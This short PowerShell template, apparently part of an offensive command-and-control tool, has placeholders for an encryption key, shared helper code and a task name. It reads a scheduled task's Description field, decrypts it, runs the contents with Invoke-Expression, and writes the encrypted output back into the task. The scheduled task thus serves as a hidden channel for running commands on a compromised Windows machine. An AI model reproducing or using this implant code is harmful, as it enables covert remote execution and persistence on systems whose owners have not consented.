$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}
$task = Get-ScheduledTask -TaskName "{taskname}" -TaskPath \;
$decryptedDescription = Decrypt-Data $encryptionKey $task.Description
$executionResult = iex $decryptedDescription | Out-String
$encryptedResult = Encrypt-Data $encryptionKey $executionResult
$task.Description = $encryptedResult
Set-ScheduledTask $task
[Environment]::Exit(0)